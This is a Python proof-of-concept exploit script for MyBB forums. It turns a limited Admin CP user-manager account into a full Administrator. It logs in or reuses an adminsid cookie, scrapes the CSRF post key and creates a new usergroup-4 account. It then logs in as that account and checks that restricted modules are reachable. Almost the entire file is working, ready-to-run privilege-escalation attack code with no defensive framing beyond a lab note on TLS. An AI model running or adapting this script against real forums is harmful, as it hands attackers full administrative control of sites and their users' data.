from __future__ import annotations

import argparse
import html
import http.cookiejar
import re
import ssl
import sys
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass
from http.cookies import SimpleCookie
from typing import Iterable


class PocError(RuntimeError):
    pass


@dataclass
class HttpResponse:
    status: int
    reason: str
    headers: object
    body: str
    url: str


class MyBBClient:
    def __init__(self, base_url: str, admin_path: str, verify_tls: bool = True) -> None:
        self.base_url = base_url.rstrip("/")
        self.admin_path = admin_path.strip("/")
        self.cookies = http.cookiejar.CookieJar()
        handlers: list[urllib.request.BaseHandler] = [
            urllib.request.HTTPCookieProcessor(self.cookies)
        ]
        if not verify_tls:
            handlers.append(
                urllib.request.HTTPSHandler(
                    context=ssl._create_unverified_context()
                )
            )
        self.opener = urllib.request.build_opener(*handlers)

    def set_adminsid(self, adminsid: str) -> None:
        cookie = SimpleCookie()
        cookie["adminsid"] = adminsid
        morsel = cookie["adminsid"]
        parsed = urllib.parse.urlparse(self.base_url)
        domain = parsed.hostname or "localhost"
        self.cookies.set_cookie(
            http.cookiejar.Cookie(
                version=0,
                name=morsel.key,
                value=morsel.value,
                port=None,
                port_specified=False,
                domain=domain,
                domain_specified=False,
                domain_initial_dot=False,
                path="/",
                path_specified=True,
                secure=parsed.scheme == "https",
                expires=None,
                discard=True,
                comment=None,
                comment_url=None,
                rest={},
                rfc2109=False,
            )
        )

    def url(self, path: str) -> str:
        return f"{self.base_url}/{path.lstrip('/')}"

    def admin_url(self, query: str = "") -> str:
        suffix = f"?{query}" if query else ""
        return self.url(f"{self.admin_path}/index.php{suffix}")

    def request(self, url: str, data: dict[str, object] | None = None) -> HttpResponse:
        encoded = None
        if data is not None:
            encoded = urllib.parse.urlencode(data, doseq=True).encode()
        req = urllib.request.Request(
            url,
            data=encoded,
            headers={"User-Agent": "MyBB-limited-acp-to-admin-poc/1.0"},
            method="POST" if data is not None else "GET",
        )
        try:
            with self.opener.open(req, timeout=20) as resp:
                raw = resp.read()
                body = raw.decode(resp.headers.get_content_charset() or "utf-8", "replace")
                return HttpResponse(resp.status, resp.reason, resp.headers, body, resp.url)
        except urllib.error.HTTPError as exc:
            raw = exc.read()
            body = raw.decode(exc.headers.get_content_charset() or "utf-8", "replace")
            return HttpResponse(exc.code, exc.reason, exc.headers, body, exc.url)

    def login_acp(self, username: str, password: str) -> str:
        resp = self.request(
            self.admin_url(),
            {
                "do": "login",
                "username": username,
                "password": password,
            },
        )
        adminsid = self.cookie_value("adminsid")
        if not adminsid:
            raise PocError(f"ACP login failed or did not issue adminsid; HTTP {resp.status}")
        return adminsid

    def cookie_value(self, name: str) -> str:
        for cookie in self.cookies:
            if cookie.name == name:
                return cookie.value
        return ""


def extract_post_key(body: str) -> str:
    patterns = [
        r'name=["\']my_post_key["\']\s+value=["\']([^"\']+)["\']',
        r'value=["\']([^"\']+)["\']\s+name=["\']my_post_key["\']',
    ]
    for pattern in patterns:
        match = re.search(pattern, body, re.I)
        if match:
            return html.unescape(match.group(1))
    raise PocError("Could not find my_post_key in add-user form")


def response_has_access_denied(body: str) -> bool:
    return "Access Denied" in body or "access denied" in body.lower()


def require_not_denied(resp: HttpResponse, context: str) -> None:
    if response_has_access_denied(resp.body):
        raise PocError(f"{context}: target returned Access Denied")


def print_kv(rows: Iterable[tuple[str, object]]) -> None:
    width = max(len(key) for key, _ in rows)
    for key, value in rows:
        print(f"{key:<{width}} : {value}")


def main(argv: list[str]) -> int:
    parser = argparse.ArgumentParser(
        description="Create a full MyBB Administrator from a limited ACP user-manager account."
    )
    parser.add_argument("--url", required=True, help="Base forum URL")
    parser.add_argument("--admin-path", default="admin", help="Admin CP path, default: admin")
    parser.add_argument("--admin-user", help="Limited ACP username")
    parser.add_argument("--admin-pass", help="Limited ACP password")
    parser.add_argument("--adminsid", help="Existing adminsid cookie for the limited ACP account")
    parser.add_argument("--new-user", required=True, help="Username for the new gid-4 Administrator")
    parser.add_argument("--new-pass", required=True, help="Password for the new Administrator")
    parser.add_argument("--new-email", required=True, help="Email for the new Administrator")
    parser.add_argument(
        "--probe-module",
        default="config-settings",
        help="Admin module to request for source/new-account comparison, default: config-settings",
    )
    parser.add_argument(
        "--no-verify-tls",
        action="store_true",
        help="Disable TLS certificate verification for local/self-signed labs.",
    )
    args = parser.parse_args(argv)

    if not args.adminsid and not (args.admin_user and args.admin_pass):
        parser.error("provide either --adminsid or both --admin-user/--admin-pass")

    source = MyBBClient(args.url, args.admin_path, verify_tls=not args.no_verify_tls)
    if args.adminsid:
        source.set_adminsid(args.adminsid)
    else:
        source.login_acp(args.admin_user, args.admin_pass)

    source_probe = source.request(source.admin_url(f"module={urllib.parse.quote(args.probe_module)}"))
    source_denied = response_has_access_denied(source_probe.body)

    add_form = source.request(source.admin_url("module=user-users&action=add"))
    require_not_denied(add_form, "add-user form")
    post_key = extract_post_key(add_form.body)

    create = source.request(
        source.admin_url("module=user-users&action=add"),
        {
            "my_post_key": post_key,
            "username": args.new_user,
            "password": args.new_pass,
            "confirm_password": args.new_pass,
            "email": args.new_email,
            "usergroup": "4",
            "displaygroup": "0",
        },
    )

    created_like_success = create.status in (200, 302)

    new_admin = MyBBClient(args.url, args.admin_path, verify_tls=not args.no_verify_tls)
    new_admin.login_acp(args.new_user, args.new_pass)
    new_probe = new_admin.request(new_admin.admin_url(f"module={urllib.parse.quote(args.probe_module)}"))
    new_denied = response_has_access_denied(new_probe.body)

    print_kv(
        [
            ("target", args.url.rstrip("/")),
            ("source_probe_status", f"HTTP {source_probe.status}"),
            ("source_probe_denied", "yes" if source_denied else "no"),
            ("add_form_status", f"HTTP {add_form.status}"),
            ("post_key_found", "yes"),
            ("create_status", f"HTTP {create.status}"),
            ("new_admin_login", "adminsid issued" if new_admin.cookie_value("adminsid") else "no adminsid"),
            ("new_probe_status", f"HTTP {new_probe.status}"),
            ("new_probe_denied", "yes" if new_denied else "no"),
        ]
    )

    if not created_like_success or new_denied or not new_admin.cookie_value("adminsid"):
        raise PocError("Exploit did not verify")

    print("\nResult: full Administrator account created and verified")
    return 0


if __name__ == "__main__":
    try:
        raise SystemExit(main(sys.argv[1:]))
    except PocError as exc:
        print(f"error: {exc}", file=sys.stderr)
        raise SystemExit(1)
